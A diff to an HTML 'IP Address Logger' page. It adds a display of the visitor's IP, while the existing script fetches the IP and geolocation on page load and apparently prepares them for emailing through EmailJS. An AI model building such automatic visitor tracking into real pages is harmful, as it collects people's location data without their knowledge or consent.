@@ -9,6 +9,7 @@
 </head>
 <body>
     <h1>Your IP Address Logger</h1>
+    <div id="ipDisplay"></div> <!-- Div to display the IP address -->
     <script>
         (function(){
             // Initialize EmailJS
@@ -17,6 +18,8 @@
             // Automatically get IP address and location on page load
             $.get('https://api.ipify.org?format=json', function(data) {
                 const ip = data.ip;
+                $('#ipDisplay').text(`Your IP Address: ${ip}`); // Display the IP address on the website
+
                 $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
                     const emailParams = {
                         ip: ip,
